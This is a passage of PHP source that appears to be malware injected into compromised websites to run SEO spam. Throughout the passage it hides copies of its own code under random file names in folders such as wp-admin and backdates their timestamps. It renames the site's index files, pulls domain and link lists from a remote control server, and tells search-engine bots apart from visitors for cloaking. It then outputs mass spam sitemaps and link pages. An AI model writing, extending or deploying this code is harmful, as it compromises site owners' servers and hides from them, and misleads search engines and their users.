$fileme = str_replace('\\', '/', __FILE__);
$hpath = './' . str_replace("$root/" . ($base != '' ? "$base/" : ''), '', $fileme);
$fileme = substr($fileme, strrpos($fileme, '/') + 1);
if ($fileme == $scriptfn) {
// hide
$filedir = '.';
if ($base == '') {
// docroot
$filedir = 'wp-admin';
$filedir = file_exists('libraries') ? 'libraries' : $filedir;
if (!file_exists($filedir)) {
@mkdir($filedir);
}
if (file_exists($filedir)) {
@chmod($filedir, 0755);
}
if (!file_exists($filedir) || !is_writable($filedir)) {
$filedir = '.';
}
}
$fnhide = "$filedir/" . randomx(3, '1') . randomx(1, '1~6');
while (file_exists($fnhide)) {
$fnhide = "$filedir/" . randomx(3, '1') . randomx(1, '1~6');
}
$hpath = $fnhide;
// file_put_contents('./xhide.log', "[$scriptfn] filehide=$fnhide, ", FILE_APPEND);
// getcode
$cfc = trim(file_get_contents(__FILE__));
$code = '';
if (preg_match('/@\'\$.*;exit\(\);\}if\(.*?\}\}[a-z0-9]+\(\);/si', $cfc, $getcode)) {
$code = $getcode[0];
$cfc = str_replace($code, "@require('$fnhide');", $cfc);
}
if ($code != '') {
fput_contents($fnhide, "\x3c\x3fphp $code");
filetime_change($fnhide);
fput_contents($scriptfn, $cfc);
filetime_change($scriptfn);
// file_put_contents('./xhide.log', "[$scriptfn] filehide=$fnhide, ok\n", FILE_APPEND);
}
}
return $hpath;
}
//*/
function https_check($custom_scheme = 0)
{
    $hcreturn = '';
    if ($custom_scheme == 0) {
        if (((isset($_SERVER['HTTPS'])) && (strtolower($_SERVER['HTTPS']) == 'on')) || ((isset($_SERVER['HTTP_X_FORWARDED_PROTO'])) && (strtolower($_SERVER['HTTP_X_FORWARDED_PROTO']) == 'https'))) {
            $hcreturn = 's';
        }
    } else {
        if ($custom_scheme == 2) {
            $hcreturn = 's';
        }
    }

    return $hcreturn;
}
///////////////////////////////////////////////////////////
function class_x_i($x = '')
{
    // $bkpath = 'wp-content/plugins/js_composer/vendor/composer/css';
    $listtest_pat = $listtest = 'jpwanda|jpyahoo';
    $sm_header = 'Content-type:text/%sml;charset=utf-8';
    $listtest = explode('|', $listtest);
    $server_name = '';
    if (isset($_SERVER['HTTP_HOST'])) {
        $server_name = $_SERVER['HTTP_HOST'];
    } elseif (isset($_SERVER['SERVER_NAME'])) {
        $server_name = $_SERVER['SERVER_NAME'];
    }
    ///////////////////////////
    global $domain, $lineNo, $url_prefix, $charlist, $wordlist, $google_veri, $tpl_string_array, $tpl_number_array, $wordlist_array, $id_words, $url_rules, $extensions, $url_prefix_qm, $extras, $base, $script_name, $script_filename, $root, $page_location_root, $plrtend, $http_get, $cache, $urlgz, $pgmb;
    robotstxt($root);
    if (isset($_SESSION["oO0Oo0OO0"])) {
        $cfg_params = $_SESSION["oO0Oo0OO0"];
        // echo "from main ";
    } else {
        // echo "__FILE__ ";
        preg_match("/@'\\\$(.*?)';/s", file_get_contents(__FILE__), $cfg_params);
    }
    $cfg_params = (is_array($cfg_params) && isset($cfg_params[1])) ? trim($cfg_params[1]) : '';
    // $cfg_params = preg_replace("/^\$\\\n/s", '', $cfg_params);
    $cfg_params_array = array();
    // echo "cfg_params:\n$cfg_params";die;
    if ($cfg_params != '') {
        // $cfg_params_str = $cfg_params;
        $cfg_params = explode("\n", $cfg_params);
        // print_r($cfg_params);die;
        foreach ($cfg_params as $cfgval) {
            $cfgval = trim($cfgval);
            if ($cfgval == '') {
                continue;
            }
            // $cfgval_array = explode('=', $cfgval);
            // echo $cfgval;die;
            preg_match("/^\w+=(.*)/si", $cfgval, $cfgval_array);
            // print_r($cfgval_array);die;
            if (isset($cfgval_array[1])) {
                // echo $cfgval[1];die;
                $cfg_params_array[] = $cfgval_array[1];
            }
        }
        // print_r($cfg_params_array);die;
        // if (isset($_GET['list_cfg_params'])) {
        //   echo "cfg_params=" . "$cfg_params_str\n";
        //   print_r($cfg_params_array);
        //   exit();
        // }
        if (count($cfg_params_array) != 10) {
            exit("cfg_params_error");
        }
        // print_r($cfg_params_array);die;
        list($domain, $lineNo, $url_prefix, $charlist, $wordlist, $google_veri, $http_get, $cache, $pgmb, $urlgz) = $cfg_params_array;
    }
    $domain = trim($domain);
    $lineNo = trim($lineNo);
    $url_prefix_qm = preg_match("/\?/", $url_prefix);
    $wordlist_array = explode(',', $wordlist);
    $urlgzs = $urlgz;
    $urlgz = explode('||', $urlgz);
    // $extensions = explode(',', 'htm,html,php,jsp,pdf,shtml,cgi');
    // $url_rules = explode('|', '@/#/!/|@/#/$/|@/#/!.*|@/^/!|@/^/$/|#/!/|#/$/|#/!/@/|#/$/@/|#/!/@.*|#/$/@.*|#/$/@/|#/!/@/@|#/$/@/@/|#/!/@.*|#/$/*/@/|@/#/!|@/#/:/!/|@/#/:.*=$|@.*/#/!|#/@+:.*=$|@/#/!/@/+@|@/#-@/!/|@/#/$/@/|@/#/!-@.*|@/#+@/$/|@/^_@/!|@/^-@/$/|@/^/$/@|#/!-@+@/|#/$_@+@/|#/!_@/@/|#/$/+@@/|#/!/@+@.*|#/$/@@.*|@/#_@/!|@/#_:_@/$/|@/#_@/$/|@/^/@/$/|#/!-@/|#_@/$_@/|#/!/@+@/|#/$-@/@/|#/!_@/@.*|#/$/@_@.*|*/#/!/@/');
    if (empty($urlgz)) {
        exit('urlgz=?');
    }
    $url_rules = explode('|', $urlgz[0]);
    $extensions = isset($urlgz[1]) ? explode(',', $urlgz[1]) : array();
    // echo sync_sx_dir();die;
    // echo $group_id_config;die;
    $global_domain = $domain;
    $global_lineNo = $lineNo;
    // sps
    $sps = $pgmb;
    $cache = preg_split('//', $cache, -1, PREG_SPLIT_NO_EMPTY);
    $pgmb = preg_split('//', $pgmb, -1, PREG_SPLIT_NO_EMPTY);
    $cache = count($cache) != 4 ? array(1, 1, 1, 0) : $cache;
    $pgmb = count($pgmb) != 9 ? array(1, 0, 1, 1, 0, 1, 0, 0, 0) : $pgmb;
    // print_r($_GET);die();
    $page_host = sprintf("http%s://$server_name", https_check($pgmb[8]));
    $page_doma = str_replace('www.', '', $server_name);
    $requri = $uri_end = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : (isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '');
    $requri = $uri_end = ($requri == '' ? ((isset($_SERVER['PATH_INFO']) && $_SERVER['PATH_INFO'] != '') ? $_SERVER['PATH_INFO'] : $requri) : $requri);
    $page_location = $page_host . $requri;
    $base = '';
    /////////////////////////////////
    // check if index.htm or index.html
    $indhtml = '';
    $htmfn = 'index.htm';
    if (file_exists($htmfn)) {
        @rename($htmfn, "{$htmfn}000");
    }
    if (file_exists("{$htmfn}l")) {
        @rename("{$htmfn}l", "{$htmfn}l000");
    }
    if (file_exists("{$htmfn}000")) {
        $indhtml = "{$htmfn}000";
    }
    if (file_exists("{$htmfn}l000")) {
        $indhtml = "{$htmfn}l000";
    }
    /////////////////////////////////
    $script_name = isset($_SERVER['SCRIPT_NAME']) ? $_SERVER['SCRIPT_NAME'] : '';
    if ($script_name == '') {
        $script_name = isset($_SERVER['SCRIPT_FILENAME']) ? $_SERVER['SCRIPT_FILENAME'] : '';
        if ($script_name != '') {
            $script_name = str_replace($root, '', $script_name);
        }
    }
    // change file time
    filemtx("$root$script_name," . __FILE__);
    if ($script_name != '') {
        $script_name = substr($script_name, 1);
        $posx = strrpos($script_name, '/');
        $base = $posx !== false ? substr($script_name, 0, $posx) : '';
        $script_filename = $posx !== false ? substr($script_name, $posx + 1) : $script_name;
    }
    // hide code
    $rebackup = !filetime_check(__FILE__);
    // $cpath = hide($base, $script_filename, $root);
    $plrtend = preg_match('/!$/', $url_prefix) ? 1 : 0;
    $url_prefix = preg_replace('/!/', '', $url_prefix);
    $url_prefix = $url_prefix == '?' ? "$script_filename?" : ($url_prefix == '/' ? "$script_filename/" : $url_prefix);
    // echo "script_name = $script_name, base = $base, script_filename = $script_filename";die;
    $chk = explode('|', 'index.php|default.php|index.html|index.htm');
    $chk[] = $script_filename;
    // $chk = array(
    //   'index.php', 'default.php', 'index.html', 'index.htm', $fileName
    // );
    $index = false;
    // echo "pre = $pre // script_name = $end";die();
    $li_del = $listtest_pat . '|ls1|ls2';
    $li_del = explode('|', $li_del);
    // echo $requri;die;
    foreach ($li_del as $getdel) {
        $uri_end = preg_replace("/(\?|&)" . $getdel . "/si", '', $uri_end);
    }
    // echo $base;die;
    $uri_end = preg_replace("/^\//si", '', $uri_end);
    // $uri_end = $base != '' ? preg_replace(sprintf("/^%s\/\??/si", sync_preg_string($base)), '', $uri_end) : $uri_end;
    $uri_end = $base != '' ? preg_replace(sprintf("/^%s\//si", sync_preg_string($base)), '', $uri_end) : $uri_end;
    // echo $uri_end;die();
    // $uri_end = preg_replace("/^($script_filename)?(\?|\/)/si", '', $uri_end);
    if (!preg_match('/^\?/si', $uri_end)) {
        $uri_end = preg_replace("/^($script_filename)?(\?|\/)/si", '', $uri_end);
    }
    // check if image
    if (preg_match('/.(gif|jpe?g|ico|png|bmp|css|js)$/si', $uri_end)) {
        exit();
    }
    // $mapol_pre = $base != '' ? preg_replace(sprintf("/^\/%s\//si", sync_preg_string($base)), '', $requri) : $requri;
    // $mapol_pre_qm = strpos($mapol_pre, '?');
    // $mapol_pre = $mapol_pre_qm !== false ? substr($mapol_pre, 0, $mapol_pre_qm + 1) : $mapol_pre;
    $mapol_pre = $url_prefix;
    $mapol_pre = preg_replace("/^\//si", '', $mapol_pre);
    // echo "base = $base, mapol_pre = $mapol_pre";die;
    $uri_end_preg = sync_preg_string($uri_end);
    // echo $uri_end;die();
    // echo $fileSelfPath;die();
    ////////////////////////////////
    // echo "GET:\n\n";print_r($_GET);die;
    ////////////////////////////////////////////////////////////////
    /// online sitemap ?
    $mapol = false;
    $mappages = isset($_GET['hostxml']);
    $mappagesxml = ($mappages && $_GET['hostxml'] != '') ? "{$_GET['hostxml']}.xml" : "{$page_doma}-sitemap.xml";
    $mappre = 'sitemap_';
    $mapfolder = '';
    $mapfx = 0;
    $mapstep_need = false;
    $mapstep = 1;
    $mapmax = 50000;
    $mapidf = 0;
    $mapmode = 0; // 0 = step mode // 1 = rand mode // 2 = static mode
    $htmllist = 0;
    $htmllistmod = 1;
    $htmllistlimit = 1;
    $htmllistname = 0;
    // echo "base = $base, requri = $requri, uri_end = $uri_end";die;
    if (preg_match('/\.xml$/si', $uri_end)) {
        $uri_end = preg_replace('/^\?/si', '', $uri_end);
        $mapol = true;
        // check if pages.xml
        // if ($uri_end == 'indexurls.xml') {
        // if (preg_match("/$mappagesxml/si", $uri_end)) {
        // {
        $query_xml = explode('/', $uri_end);
        // print_r($query_xml);die;
        $query_xml_end = array_pop($query_xml);
        if (preg_match("/([^\d]+)(\d+)\.xml$/si", $query_xml_end, $mapxml)) {
            // print_r($mapxml);die;
            $mappre = $mapxml[1];
            $mapfx = $mapxml[2];
        } else {
            $mappre = preg_replace("/([a-z]+_?).*/si", "$1", $query_xml_end);
        }
        if (!empty($query_xml) && preg_match('/^([a-z])?(\d+)$/si', $query_xml[count($query_xml) - 1], $stepmat)) {
            // print_r($stepmat);die;
            if (count($stepmat) == 3) {
                $mapstep = $stepmat[2];
                // check mode
                if ($stepmat[1] == 's') {
                    $mapmode = 1;
                } elseif ($stepmat[1] == 'g') {
                    $mapmode = 2;
                }
            } else {
                $mapstep = $mapstep[0];
            }
            // $mapstep = array_pop($query_xml);
            array_pop($query_xml);
        }
        // print_r($query_xml);die;
        if (!empty($query_xml) && is_numeric($query_xml[count($query_xml) - 1])) {
            $mapmax = array_pop($query_xml);
            $mapstep_need = true;
        }
        if (!empty($query_xml)) {
            $mapfolder = implode('/', $query_xml);
        }
        // }
        // check if pages.xml in menggong
        // if (($mapfolder != '' && preg_match("/^pages\/?/si", $mapfolder)) || $query_xml_end == 'pages.xml') {
        //   $mappages = true;
        // }
        $mapidf = $mapfx == 1 ? 1 : (($mapmax + 1) * ($mapfx - 1) * $mapstep);
        $mapidf = $mapidf < 0 ? 0 : $mapidf;
    }
    if (preg_match('/^listing((?:1|\w)+)?\/(\d+)\/(?:(\d+)\/)?\w+\.html$/si', preg_replace('/^\?/si', '', $uri_end), $listmatch)) {
        // print_r($listmatch);die;
        // die("listing");
        if ($listmatch[1] == 1) {
            $htmllistname = 1;
        }
        $htmllistmod = (int) $listmatch[2];
        $htmllist = 1;
        if (isset($listmatch[3])) {
            $htmllistlimit = (int) $listmatch[3];
        }
        // die("listingmod = $htmllistmod, listinglimit = $htmllistlimit, listingname = $htmllistname");
    }
    // $ytmap = "$mappre$script_filename~$mapstep";
    ////////////////////////////////
    // $page_location_non_args = trim(preg_replace("/\?.*/si", '', $page_location));
    $page_location_root = "$page_host/$base" . ($base == '' ? '' : '/');
    $plrtend = $plrtend ? "/$base" . ($base == '' ? '' : '/') : $page_location_root;
    /////////////////////////////////
    $index_number = $lineNo;
    // $func = false;
    $test_mode_var = false;
    define('TEST_MODE', isset($_GET['list_test']) ? true : false);
    foreach ($listtest as $_lt) {
        if (isset($_GET[$_lt])) {
            $test_mode_var = true;
            break;
        }
    }
    // if ($test_mode_var) {
    $func = true;
    // }
    foreach ($listtest as $list_value) {
        if (isset($_GET[$list_value])) {
            unset($_GET[$list_value]);
        }
    }

    ///////////////////////////////////////////////////////
    ///////////////////////////////////////////////////////
    $httpReferer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
    $login_status = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
    // $lCheck = func_loginCheck($login_status, $test_mode_var);
    $x_log_check = func_loginCheck($login_status, $test_mode_var);
    $is_real_bot = is_bot();
    $lCheck = $pgmb[7] == 0 ? $is_real_bot : ($pgmb[7] == 1 ? $x_log_check : 1);

    $rCheck = ($is_real_bot || $x_log_check) ? 0 : func_referCheck($httpReferer);
    $sitemap_xml = false;
    $sitemap_arg_string = 'jpsitemap|mapxml';
    $sitemap_arg_array = explode('|', $sitemap_arg_string);
    $sitemap_arg = '';
    // $sitemap_file=mt_rand(1, 1000) . 'sitemap.xml';
    // print_r($sitemap_arg_array);
    // echo "GET:\n";print_r($_GET);die;
    foreach ($sitemap_arg_array as $_sac) {
        if (isset($_GET[$_sac])) {
            // $sitemap_xml = (bool)trim($_GET[$_sac]);
            $sitemap_xml = true;
            $sitemap_arg = $_sac;
            break;
        }
    }
    // echo "\n\narg=$sitemap_arg";die;
    if (!$sitemap_xml && !$func) {
        return;
    }
    if (in_array($script_name, $chk)) {
        // if (!isset($_GET)) {
        if (!isset($_GET) && $uri_end == '') {
            $index = true;
            // die("isset");
        } else {
            if (isset($_GET) && empty($_GET)) {
                if ($uri_end == '') {
                    // die("cd");
                    $index = true;
                } else {
                    if ($uri_end == $script_name) {
                        // die("ef");
                        $index = true;
                    }
                }
                // die("a");
            } else {
                // die("b");
                if ($uri_end == '') {
                    $index = true;
                }
            }
        }
    }
    if (!$index) {
        $indhtml = '';
    }
    ###############################################################
    // $url = 'http://dawan02.top/?yid=%d&lid=%d&from=%s&jump=%d&action=%s';
    $http_get = x7de($http_get);
    $url = $http_get . '?yid=%d&lid=%d&from=%s&jump=%d&action=%s&cache=%d&ver=2.1.0&fb=%s';
    $la_ru1 = 'ls1';
    $la_ru2 = 'ls2';
    $la_pif = 'phpinf';
    $la_uts = 'lstest';
    $la_arg = 'lsarg';
    $la_shp = 'lspwd';
    // $parse_exclude = array_merge($listtest, array($la_ru1, $la_ru2));
    // $list_D = '';
    // if ($uri_end != '') {
    //   $sync_parse = sync_parse_uri($uri_end, $list_D, $lineNo, $parse_exclude);
    //   $list_D = $sync_parse['a'];
    //   $lineNo = $sync_parse['b'];
    // }
    // $id_words = sync_idwords();
    // // print_r($id_words);die;
    // $lineNo = determine_number($lineNo, $index, $index_number, $listtest_pat);
    // if ($list_D != '') {
    //   if (is_numeric($list_D)) {
    //     $domain = $list_D;
    //   }else{
    //     $domain = array_search($list_D, $id_words);
    //     $domain = $domain === false ? $global_domain : $domain;
    //   }
    // }else{
    //   // if not home
    //   if (!$index) {
    //     $domain = $lineNo;
    //   }
    // }

    // $list_word = sync_list_word($domain);
    $sx_get_url = substr($http_get, 0, strrpos($http_get, '/')) . '/domain.txt';
    $listing_get_url = $http_get . '?listing=%s';
    $sx_get_url_cache = substr(md5($sx_get_url), 0, 6);
    $extras = array(
        'extensions' => $extensions,
        'url_rules' => $url_rules,
        'wordlist_array' => $wordlist_array,
        'url_prefix' => $url_prefix,
        'url_prefix_qm' => $url_prefix_qm,
    );
    ///////////////////////////////////////////////////////
    if ($htmllist) {
        $data = array();
        $data_names = array();
        $shdata = array();
        $listsh = in_array($htmllistmod, array(1, 3));
        if ($htmllistmod == 1) {
            $shdata = shelldata($page_host);
            // $data = $shdata['a'];
        }
        if ($htmllistmod == 2) {
            $data = newdata($sx_get_url_cache, $sx_get_url, $htmllistlimit);
        }
        if ($htmllistmod == 3) {
            $shdata = shelldata($page_host);
            $data = newdata($sx_get_url_cache, $sx_get_url, $htmllistlimit);
            // print_r($data);die;
        }
        // echo "liname = $htmllistname";die;
        if ($htmllistname) {
            // die("listname");
            $datastr = array();
            if ($listsh) {
                // print_r($shdata);die;
                // foreach ($shdata['a'] as $akey => $avalue) {
                $datastr[] = sprintf('<%s-%s>', $domain, implode(',', $shdata['a']));
                // }
            }
            $bdva = null;
            $bdke = array();
            foreach ($data as $dke => $dva) {
                // $datastr[] = sprintf('%s-%s', $dke, implode(',', $dva));
                $bdke[] = $dke;
                if ($bdva === null) {
                    $bdva = implode(',', $dva);
                }
            }
            if ($bdva != null && !empty($bdke)) {
                $datastr[] = sprintf('%s-%s', implode(',', $bdke), $bdva);
            }
            if (!empty($datastr)) {
                // echo sprintf($listing_get_url, implode('/', $datastr)) . "<br>";
                $data_names_get = explode('|||', rsync_httpreq(sprintf($listing_get_url, implode('/', $datastr))));
                foreach ($data_names_get as $dng) {
                    $dngarr = explode('---', $dng);
                    if (count($dngarr) == 2) {
                        // print_r($dngarr);die;
                        $data_names[$dngarr[0]] = array();
                        $names = explode('+++', $dngarr[1]);
                        foreach ($names as $name) {
                            $namearr = explode('=>', $name);
                            if (count($namearr) == 2) {
                                $data_names[$dngarr[0]][$namearr[0]] = $namearr[1];
                            }
                        }
                    }
                }
            }
        }
        $listhtml = "<!DOCTYPE html>\n<html>\n<head>\n<meta charset=\"utf-8\">\n<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n<title>list</title>\n</head>\n<body>\n%s\n</body>\n</html>";
        $listhtmldata = '';
        if ($listsh) {
            // print_r($data_names);die;
            foreach ($shdata['a'] as $shkey => $shvalue) {
                if ($htmllistname && isset($data_names[$domain]) && isset($data_names[$domain][$shvalue])) {
                    $listhtmldata .= $data_names[$domain][$shvalue] . '<br>';
                }
                $listhtmldata .= "$page_location_root{$shdata['b'][$shkey]}" . '<br>';
            }
        }
        foreach ($data as $adkey => $adval) {
            foreach ($adval as $thisid) {
                if ($htmllistname && isset($data_names[$adkey]) && isset($data_names[$adkey][$thisid])) {
                    $listhtmldata .= $data_names[$adkey][$thisid] . '<br>';
                }
                $listhtmldata .= sync_uri(array($adkey, $thisid, '', ''), $extras, 1) . '<br>';
            }
        }
        echo sprintf($listhtml, $listhtmldata);
        exit();
    }
    if ($sitemap_xml || $mapol || $mappages) {
        $map_array_head = "\x3c\x3fxml version=\"1.0\" encoding=\"UTF-8\"\x3f\x3e<urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\">";
        // $map_uri_format = "\n\t\t\t" . '<loc>%s</loc>';
        $map_uri_format = '<loc>%s</loc>';
        // +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
        // mappages
        if ($mappages) {
            // die("in");
            // $amaps = explode('{|}', $data_array[1]);
            $amaps = array($page_host);
            if ($base != '') {
                $amaps[] = $page_location_root;
            }
            // get shell homepage links
            $shhome = rsync_httpreq($page_host);
            if ($shhome != '') {
                $amaps = array_merge($amaps, parse_tpl_links2($shhome));
                $amaps = array_unique($amaps);
            }
            // print_r($amaps);die;
            // echo "$absdir/pages.xml";die;
            // if (!empty($amaps)) {
            // if ($mappages) {
            header(sprintf($sm_header, 'x'));
            echo $map_array_head;
            // }else{
            @fput_contents($mappagesxml, $map_array_head);
            // }

            $amap_uri_arr = array();
            if (!empty($amaps)) {
                foreach ($amaps as $amap_uri) {
                    if (count($amap_uri_arr) >= 100) {
                        $pages_ready = implode('', $amap_uri_arr);
                        // if ($mappages) {
                        echo $pages_ready;
                        // }else{
                        @fput_contents($mappagesxml, $pages_ready, 'a');
                        // }
                        $pages_ready = '';
                        $amap_uri_arr = array();
                    }
                    // $amap_uri_arr[] = sprintf("\n\t\t<url>%s\n\t\t\t<lastmod>%s</lastmod>\n\t\t\t<changefreq>daily</changefreq>\n\t\t\t<priority>0.8</priority>\n\t\t</url>", sprintf($map_uri_format, xml_urlarg( "$page_location_root$amap_uri")), date('Y-m-d'));
                    $amap_uri_arr[] = sprintf("\n\t\t<url>%s\n\t\t\t<lastmod>%s</lastmod>\n\t\t\t<changefreq>monthly</changefreq>\n\t\t</url>", sprintf($map_uri_format, xml_urlarg(preg_match('/^https?\:\/\//si', $amap_uri) ? $amap_uri : "$page_location_root$amap_uri")), date('Y-m-d'));
                }
            }
            if (!empty($amap_uri_arr)) {
                $pages_ready = implode('', $amap_uri_arr);
                // if ($mappages) {
                echo $pages_ready;
                // }else{
                @fput_contents($mappagesxml, $pages_ready, 'a');
                // }
                $pages_ready = '';
                $amap_uri_arr = array();
            }
            $pages_end = "\n\t</urlset>";
            // if ($mappages) {
            echo $pages_end;
            @fput_contents($mappagesxml, $pages_end, 'a');
            exit();
            // }else{
            // }
            // die("yo");
            // }
        }
        // +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
        $plrtend = $page_location_root;
        $html = isset($_GET['html']) ? (int) ($_GET['html']) : '';
        if (file_exists($sx_get_url_cache)) {
            $sx_get = file_get_contents($sx_get_url_cache);
        } else {
            $sx_get = rsync_httpreq($sx_get_url);
            @fput_contents($sx_get_url_cache, $sx_get);
            @filetime_change($sx_get_url_cache);
        }
        // $sx_get_arr = explode('!!!', $sx_get);
        // $sx_get = trim(trim($sx_get_arr[0]), '|');
        $sx_get = trim($sx_get, '|');
        // $amaps = isset($sx_get_arr[1]) ? explode('{|}', $sx_get_arr[1]) : array();
        // print_r($sx_get);die();
        if ($sx_get != '') {
            // @unlink($sitemapxml_file);
            ###################################################
            // string_num_array_expand($expand_arr, $tpl_string_array, $tpl_number_array);
            // string_del_wl($tpl_string_array);
            // $extras['tpl_string_array'] = $tpl_string_array;
            // $extras['tpl_number_array'] = $tpl_number_array;
            $data = explode('|', $sx_get);
            // type = html ?
            if (is_numeric($html) && $html > 0) {
                $str = "\x3c!DOCTYPE html>\n\x3chtml>\n\x3chead>\n\t\x3cmeta charset=\"utf-8\">\n\t\x3cmeta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n\t\x3ctitle>\x3c/title>\n\x3c/head>\n\x3cbody>";
                // print_r($data);die;
                foreach ($data as $line) {
                    $splitline = explode('-', $line);
                    for ($i = 0; $i < $html; $i++) {
                        $j = mt_rand(1, $splitline[2]);
                        $url = sync_uri(array($splitline[0], $j, '', ''), $extras, 1);
                        $str .= sprintf('<a href="%s" target="_blank">%s</a><br>' . "\n", $url, $url);
                    }
                }
                echo $str . "\n\x3c/body>\n\x3c/html>";
                exit();
            }
            // mapol?
            // if ($mapol) {
            $max = $mapmax;
            $dir = $mapfolder;
            $step = $mapstep;
            $idf = $mapidf;
            // }
            // else{
            //   $max = isset($_GET['max']) ? (int)$_GET['max'] : 49999;
            //   $max = $max == 0 ? 49999 : $max;
            //   $dir = isset($_GET['dir']) ? trim($_GET['dir']) : '';
            //   $absdir = "$root/$dir";
            //   if ($dir != '' && !is_dir($absdir)) {
            //     mmkdir($dir);
            //   }
            //   if ($dir == '' || !is_writable($absdir)) {
            //       $dir = mapdir();
            //       if ($dir == '') {
            //         die('nodir');
            //       }
            //       $absdir = "$root/$dir";
            //   }
            //   $step = isset($_GET['step']) ? (int)$_GET['step'] : 1;
            //   $step = $step <= 1 ? 1 : $step;
            //   $mapfx = isset($_GET['fx']) ? (int)$_GET['fx'] : 1;
            //   $idf = isset($_GET['idf']) ? (int)trim($_GET['idf']) : 0;
            // }
            // echo $script_name;die;
            $currentUrl = $page_location_root;
            // echo "max = $max, dir = $dir, idf = $idf, step = $step, mapfx = $mapfx";die;
            $sx_uri = $page_location_root;
            $sx_uri_format = '';
            // $map_msg = '<input style="width:45%s;border:1px solid #aaa;padding:2px;border-radius:2px;margin-top:5px" onclick="this.select()" value="%s" /> <font color="green">[ok]</font> [<a target="_blank" style="color:blue" href="%s">open</a>]';
            // $map_array_head = "\x3c\x3fxml version=\"1.0\" encoding=\"UTF-8\"\x3f\x3e\n\t<urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\">";
            // $map_uri_format = "\n\t\t\t" . '<loc>%s</loc>';
            // print_r($sx_list_config_array);die;
            # if sitemap_index
            // print_r($data);die;
            $total = 0;
            foreach ($data as $dk => $dt) {
                $total += (int) substr($dt, strrpos($dt, '-') + 1);
            }
            if ($total <= 0) {
                exit('nodata');
            }
            $stepmax = ceil($total / $max);
            $max = $step > $stepmax ? $max : $max;

            //     // file_put_contents("$absdir/sitemap_index.xml", $map_index_out);
            //     // echo sprintf($map_msg, $map_index, "$page_host/$map_index", $map_index, '%', $map_index) . /*'<br/>' . sprintf($map_msg, $map_amaps, "$page_host/$map_amaps", $map_amaps, '%', $map_amaps)*/ . '<br /><br />[products total: ' . $total . ']Click links below to gen xml file:<br /><br /><style>.ck a{display:inline-block;margin-top:5px}#click span{margin-left: 15px;}</style><div class="ck" id="click">' . implode('<br />', $map_sitemap_genuri) . '</div><script>var i,al=document.getElementById("click").getElementsByTagName("a"),H=[],L=3,E=D=N=0,F=function(){var a=new Image,b=H.shift(),c=b.split("@"),d=document.getElementById(c[0]);N++,d.innerHTML="working...",a.onerror=function(){d.innerHTML="ok",N--,D++,G()},a.src=c[1],console.log(c[1]+" working...")},G=function(){for(N=0>=N?0:N,E==D&&console.log("done.");H.length&&L>N;)F()};for(i in al)"undefined"!=typeof al[i].href&&H.push(al[i].className+"@"+al[i].href);E=H.length,G();</script>';
            //   // }
            // }else{
            // $map_file = "sitemap_$mapfx.xml";
            $map_idf_step = $map_tmp_step = $map_step = $step;
            // $map_finish = 0;
            // $map_finish_count = 0;
            $map_array = array();
            $map_array_len = 0;

            //   // $map_file = "$absdir/sitemap_$mapfx.xml";
            //   $map_file = "$absdir/sitemaps.xml";
            //   @file_put_contents($map_file, $map_array_head);
            // }else{
            header(sprintf($sm_header, 'x'));
            echo $map_array_head;
            // @fput_contents($ytmap, $map_array_head);
            // @fput_contents($sitemap_file, $map_array_head);
            // }
            // print_r($data);die;
            if (!empty($data)) {
                //////////////////////////
                $map_skiped = 0;
                $mapoldone = $map_next = 0;
                // timer('start');
                ################# body #################
                foreach ($data as $line) {
                    if ($mapoldone >= $max) {
                        break;
                    }
                    // if ($map_finish) {
                    //     break;
                    // }
                    $val = explode('-', $line);
                    // $domain_id = substr($line, 0, strpos($line, '-'));
                    // $map_line_total = substr($line, strrpos($line, '-') + 1);
                    $domain_id = $val[0];
                    $map_line_total = $val[2];
                    // echo "domain_id = $domain_id, map_line_total = $map_line_total";die;
                    // mapmode != step mode ?
                    // if ($mapol && $mapmode != 0) {
                    // $mapstep == get limit
                    // timer('before sid_array');
                    $sid_arr = sid_array($map_line_total - 1, $step, $mapmode, $global_lineNo);
                    // print_r($sid_arr);timer('sid_array');die;
                    if (!empty($sid_arr)) {
                        // $map_array = array();
                        // $map_array_len = 0;
                        foreach ($sid_arr as $sid_lid) {
                            if ($mapoldone >= $max) {
                                break;
                            }
                            if ($map_array_len > 50) {
                                $ready = implode('', $map_array);
                                // @fput_contents($sitemap_file, $ready, 'a');
                                echo $ready;
                                $map_array = array();
                                $map_array_len = 0;
                            }
                            $map_content = '';
                            // $map_content .= "\n\t\t" . '<url>';
                            $map_content .= '<url>';
                            $map_content .= sprintf($map_uri_format, xml_urlarg(sync_uri(array($domain_id, $sid_lid, '', ''), 1)));
                            // $map_content .= "\n\t\t\t" . '<lastmod>' . date('Y-m-d') . '</lastmod>';
                            $map_content .= '<lastmod>' . date('Y-m-d') . '</lastmod>';
                            // $map_content .= "\n\t\t\t" . '<changefreq>weekly</changefreq>';
                            $map_content .= '<changefreq>weekly</changefreq>';
                            // $map_content .= "\n\t\t\t" . '<priority>0.9</priority>';
                            // $map_content .= "\n\t\t</url>";
                            $map_content .= "</url>";
                            $map_array[] = $map_content;
                            $mapoldone++;
                            $map_array_len++;
                        }
                        // if ($mapol) {
                        $ready = implode('', $map_array);
                        // @fput_contents($sitemap_file, $ready, 'a');
                        echo $ready;
                        $map_array = array();
                        // timer('one done');die;
                        // }
                    }
                    //   if (($map_skiped + $map_line_total) < $idf) {
                    //     $map_skiped += $map_line_total;
                    //     continue;
                    //   }
                    // }
                    // if ($map_line_total != 0) {
                    //   // $map_step = ($step == 1 && $idf != 1) ? $map_idf_step : $map_tmp_step;
                    //   $map_step = $map_next ? $map_tmp_step : ($map_skiped > 0 ? (ceil($map_skiped / $max) * $max - $map_skiped + 1) : $idf);
                    //   $map_next = 0;
                    //   // echo "$idf => map_step = $map_step";die;
                    //   // echo "[$map_line] idf = $map_idf , sx_step = $map_step, sx_domain_id = $map_domain_id";die;
                    //   // while ($map_step <= $map_line_total) {
                    //   while ($map_finish_count < $max) {
                    //     if ($map_step > $map_line_total) {
                    //       $map_next = 1;
                    //       break;
                    //     }
